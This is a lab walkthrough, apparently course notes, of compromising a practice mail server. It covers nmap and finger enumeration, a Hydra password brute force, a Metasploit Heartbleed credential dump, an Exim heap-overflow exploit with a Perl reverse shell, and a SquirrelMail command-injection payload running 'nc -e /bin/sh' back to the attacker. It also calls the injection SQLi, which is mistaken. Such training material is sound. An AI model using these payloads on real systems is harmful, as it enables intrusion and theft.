# Finding and Enumerating the Mail Server

## Mail Sever
![hh-mailserver](https://github.com/user-attachments/assets/bcda3935-8280-4768-b76d-adc952fd52ab)


## Found IP of the target server using: ip addr and ip neigh to find mailserver's IP
![finding-mailserver](https://github.com/user-attachments/assets/2def4400-7949-40fa-a241-137ca3384971)

ip addr to find my own IP on the network: 192.168.56.102
search network for devices: nmap -sn 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 04:58 UTC
Nmap scan report for 192.168.56.101
Host is up (0.0033s latency).
Nmap scan report for 192.168.56.102
Host is up (0.00068s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 60.05 seconds

Using ip neighbor:
192.168.56.101 dev enp0s3 lladdr 08:00:27:ea:6b:f3 STALE 
192.168.56.100 dev enp0s3 lladdr 08:00:27:6a:74:4e REACHABLE 
192.168.56.1 dev enp0s3 lladdr 0a:00:27:00:00:0b STALE

So we know the mailserver's IP is 192.168.56.101

## Running a scan of ports on 192.168.56.101
![nmap-scan-hh-mailserver](https://github.com/user-attachments/assets/f0749d52-954a-4b1f-ab07-f80248f1283d)

![nmap-scan-hh-mailserver](https://github.com/user-attachments/assets/1b9e2a0a-dd68-4b7e-a234-8321d6c0a334)


Targets:
25/tcp   open  smtp     syn-ack Exim smtpd 4.68
    Search for vulns in Exim smtpd 4.68
    
110/tcp  open  pop3     syn-ack Cyrus pop3d 2.3.2

143/tcp  open  imap     syn-ack Cyrus imapd 2.3.2

79/tcp   open  finger   syn-ack Linux fingerd
|_finger: No one logged on.\x0D
+ Trying to connect to finger service using Netcat
     nc 192.168.56.3 79

## Results 
![finding-users](https://github.com/user-attachments/assets/c180987f-c1a7-467b-b8b2-c55eadcc3b7e)
     
nc 192.168.56.3 79
admin
finger: admin: no such user.
┌─[parrot@parrot]─[~/Desktop/hh-mail-server]
└──╼ $nc 192.168.56.3 79
root
Login: root           			Name: root
Directory: /root                    	Shell: /bin/bash
Never logged in.
No mail.
No Plan.


visiting website for the mailserver: http://192.168.56.3 gives us this info:
    SquirrelMail version 1.4.18
    For all enquiries please email johnk@mailserver01

![create-usernames](https://github.com/user-attachments/assets/744dc338-374f-4e5d-934f-6718a80531c8)

    
Generated some usernames with a wordlist, now going to use finger to see if we can find some real users and piping that to grep -v "no such user." which is inverse match so we only get real users outputted:

`cat usernames.txt | parallel -j 5 finger {}@192.168.56.3 | grep -v "no such user."`
+ Piping this into realusers.txt gives us a list of just the real users on the mailserver.

+ Let's now use Hydra to try to brute-force POP3 using ouur realusers.txt list and the hackerhouse weak_passwords.txt list:

hydra -L realusers.txt -P ./pentesting/hackerhouse/wordlists/weak_passwords.txt 192.168.56.3 pop3


##Results:
[110][pop3] host: 192.168.56.3   login: charliew   password: private
[110][pop3] host: 192.168.56.3   login: johnk   password: webmail
[110][pop3] host: 192.168.56.3   login: sarahk   password: webmail


Now we can try logging in as users on various services. We can assume from the web facing version of this mailserver that the emails are <user>@mailserver01.


### Logging into IMAP
![charliew_imap_login](https://github.com/user-attachments/assets/c5481811-be2c-4679-95ae-e0d99227e460)


+ Helpful info: **https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/**
+ Was able to login as Charliew into IMAP using
    >`telnet 192.168.56.101 143`
    >`a1 LOGIN charliew private`
    >`a2 LIST "" "*"`  <--list all
### Logging into POP3
![charliew-pop3-1](https://github.com/user-attachments/assets/714cfe9a-3439-4df1-9177-3bd2a48a424f)


+ Used `nc 192.168.56.101 110`
    >`USER charliew`
    >`PASS private`
    >`LIST` <-- List emails
    >`RETR {NUMBER}` <-- retrieving specific emails
+ Was able to read 3 emails from the charliew POP3 account. Looks like they recently changed the **root** password from the _"usual"_ password on the servers because of a recent **SQLi** attack "last month". 
+ This email was sent by john (johnk). We have his account password as`webmail` and his email is `johnk@mailserver01`.
    
    
+ Going back to SMTP. Using NSE, we can use SMTP scripts (either a specfic one or all as):
    nmap --script=smpt-* 192.168.56.101 25

+ The results of this is some CVEs that SMTP Exim 4.68 software that is running on the mailserver is likely vulnerable to:
    >`smtp-vuln-cve2010-4344: Exim version: 4.68
    Exim heap overflow vulnerability (CVE-2010-4344):
    Exim (CVE-2010-4344): LIKELY VULNERABLE
    Exim privileges escalation vulnerability`              

    >`(CVE-2010-4345):
    Exim (CVE-2010-4345): LIKELY VULNERABLE
    To confirm and exploit the vulnerabilities, 
    run with -- 
    script-args='smtp-vuln-cve2010-4344.exploit'`

+ Using searchsploit, to verify vulnerability in SMTP's Exim software:
    >`searchsploit exim`
+ One of the results we get looks promising, it is Exim4-Exim4.69 (which includes our version which is 4.68. It also has (Metasploit) in the title, meaning there is most likely a module on Metsploit we can make use of to exploit this vulnerability. Also, it is a Heap Buffer Overflow that is a Linux remote exploit. This could be very powerful and useful.
    >`Exim4 < 4.69 - string_format Function Heap Buffer Overflow(Metasploit)  | linux/remote/16925.rb`
+ A buffer overflow works by overwriting data outside the allocated memory space for a program. This mean adjacent memory is overwritten, this could allow you to place executable code in a part of memory where there is no protection (due to it being out of the given memory space for the program).


+ Book suggests trying to see if HeartBleed will also work on the server. First determine version of ssl on your system to make sure your version won't interfere with determining if the target is vulnerable to HeartBleed.
    >`sslscan version`
    >`Version: 2.1.3-static
    OpenSSL 3.0.13 30 Jan 2024`

+ Now we are going to see about downgrading ssl version for this purpose.
    >ldd `which sslscan`
+ If `libssl` or a similar library is not being used, then it means that your system is using static OpenSSL libraries for testing. So we will have to downgrade.
+ Download from `old.kali.org`
    >`wget http://old.kali.org/kali/pool/main/s/sslscan/sslscan_1.9.10-rbsec-0kali1_amd64.deb`
    >`dpkg -i sslscan_1.9.10-rbsec-0kali1_amd64.deb`
    >`sslscan --version`:
		-static
		OpenSSL 1.0.1m-dev xx XXX xxxx
+ Once you are done, you can go back to the newer version
    >`sudo apt update sslscan`
+ Now that we have this version of OpenSSL installed, we can use `sslscan` to check if the mailserver has a vulnerability to HeartBleed.
    >`sslscan 192.168.56.101`
+ You may have to run this tool multiple times as inaccurate results do happen
    >Heartbleed:
    TLS 1.0 not vulnerable to heartbleed
    TLS 1.1 **_vulnerable_** to heartbleed
    TLS 1.2 **_vulnerable_** to heartbleed

+ The Nmap script `ssl-heartbleed` is less reliant on your local SSL version, and will probe for a vulnerability to HeartBleed.
    >`nmap -p 443,80 --script=ssl-heartbleed 192.168.56.101`
+ The result from Nmap tells us that the server is indeed vulnerable to HeartBleed.
+ Now searching for heartbleed using msfconsole (Metasploit). There are modules for recon (seeing if there is a vuln present) and for exploitation (using heartbleed to attack the service).
    >`msfconsole`
    >`search heartbleed`
+ Found a auxiliary scanner for ssl heartbleed
    >`auxiliary/scanner/ssl/openssl_heartbleed   2014-04-07   normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak`
+ I will use this module to scan the server for the vulnerability (port 443)
    >`use auxiliary/scanner/ssl/openssl_heartbleed`
+ Then we want to see the options available to us on this module, most likely the remote host needs to be set.
    >`set RHOSTS 192.168.56.101`
    >`run` or `exploit`  <-This will scan for the vulnerability
    >`set ACTION DUMP`
    >`run`
+ Then we get this output
    >[+] 192.168.56.101:443    - Heartbeat response with leak, 65535 bytes
    >[+] 192.168.56.101:443    - Heartbeat data stored in /home/user/.msf4/loot/20240820194019_default_192.168.56.101_openssl.heartble_682346.bin
    >[*] 192.168.56.101:443    - Scanned 1 of 1 hosts (100% complete)
    >[*] Auxiliary module execution completed
+ Now we need to copy the filepath above and paste it into the terminal using strings to read the file
    >`strings /home/user/.msf4/loot/20240820194019_default_192.168.56.101_openssl.heartble_682346.bin`
+ Stored this into a new file called `msfc_out`, though the important part of this information dump is:
    >`login_username=jennya&secretkey=J3nnyl&js_autodetect_results=1&just_logged_in=1`
+ It looks like we got some login credentials. `User:jennya` and `password:J3nnyl`
+ Let's see if we can login to this user's webmail account.
+ I can't seem to login as this user...
+ Moving on to trying to exploit Exim from where we left off before. 
    >`Exim4 < 4.69 - string_format Function Heap Buffer Overflow(Metasploit)  | linux/remote/16925.rb`
+ The previous result was from searchsploit, but using Metasploit we can find this module which looks like the same one:
    >`4  exploit/unix/smtp/exim4_string_format     2010-12-07   excellent  No  Exim4 string_format Function Heap Buffer Overflow`
+ To use this:
    >`use 4`
+ Looks like the main option we need to set is RHOSTS again. 
+ We can take a look at payloads for this module using `show payloads`
+ We have options, we are going to go with the Perl reverse shell one (it is common for systems to have Perl, Python, and Ruby to be present on UNIX-like systems).
+ If a payload doesn't work, we can always try others until we get the shell. This is a bruteforce way of finding out what programming langauges are installed on the target system.
    >`8   payload/cmd/unix/reverse_perl  normal  No     Unix Command Shell, Reverse TCP (via Perl)`
    >`set PAYLOAD 8`
+ Since the payload chosen is a reverse shell, we need to set the localhost `LHOST` and local port `LPORT`
+ I am setting to port 443 to appear as web traffic and reduce the chance of appearing as suspicious traffic.
+ Got root, but do not have a stable shell. The next step is to upgrade the shell, to do this we are going to try using Python:
    >`python -c "import pty; pty.spawn('/bin/bash')"`
+ For metasploit, we can also use `sessions -u` to upgrade our shell
+ Able to dump contents of `/etc/passwd` and `/etc/shadow` and stored them in `mail_passwd` and `mail_shadow` respectively.
-----------------------------------------------------------------------------------------------------------------------------

## Exploting SquirrelMail through PHP (CVE-2017-7692) RCE
+ Since the webmail client shows us that it is using SquirrelMail, looking it up using searchsploit or exploit-db, shows that it has some vulns. 
+ For the version running on this server (1.4.18), the exploit we can use is for all versions under 1.4.22:
    >`SquirrelMail < 1.4.22 - Remote Code Execution`
+ I was able to find an exploit written in bash on exploit-db, saving it as `sqm_rce`.
+ Logged in as `charliew` on the webpage for the mailserver.
+ Under `options` is a `personal information` link. 
+ Turning on `intercept` in Burp Suite, let's change the email address to `a@a.com`.
+ In Burp Suite, on the `intercept` tab, the `new_email_address` param can be changed in the intercepted POST request to:
    >`new_email_address=a%40localhost%09-be%09${run{"/bin/nc%09-e%09/bin/sh%09192.168.56.102%0980"}}`
+ This is a command injection that runs this command in URL format:
    >`{run{"/bin/nc -e /bin/sh 192.168.56.102 80"}}`
+ This creates a revshell to connect back to my machine using SQLi to start NetCat executing an`sh` shell on port `80`.
+ This command relies on the vulnerability in PHP's Mailer API. Essentially it detects spaces, even URL encoded, and will cause a command to fail if spaces are detected. However, th symbol `%09` represents a tab in URL format, and therefore this will pass through with the same effect of using a space.
+ Before sending this request through on Burp, set up a netcat listener: `nc -lvnp 80`
+ Then hit `forward` on burp.
+ **_Important_** the SquirrelMail command injection does _not_ occur until you **_send_** an email from an account (when the tab sequence is ultimately passed to a command line MTA via PHP), at which point you should see that a connection has been made via your netcat listener on port 80. 
+ I will send an email to johnk: johnk@mailserver01, saying hello
+ After getting the reverse shell I used the `which` command to find out which, if any, version of python is installed on the system: `which python python2 python3`.
+ The result is python and python2. So I use the simple reverse shell upgrade: 
    >`python -c 'import pty;pty.spawn("/bin/bash")';`

![got_root](https://github.com/user-attachments/assets/b67aebd7-dff6-4e3f-aaa4-26812643c22d)

![upgraded_root](https://github.com/user-attachments/assets/ecab960f-cdc7-4e50-a6a2-050bc6444d44)


+ Next steps are:
    >`CTRL+Z`
    >`stty raw -echo`
    >`stty size`
+ On the victim's machine type:
    >`export SHELL=bash`
    >`stty rows $x columns $y` # set remote shell to x nuber of rows and y columns
    >`export TERM=xterm-256color` #allows you to clear console and have color output

+ More info on upgrading shells: `https://zweilosec.github.io/posts/upgrade-linux-shell/`

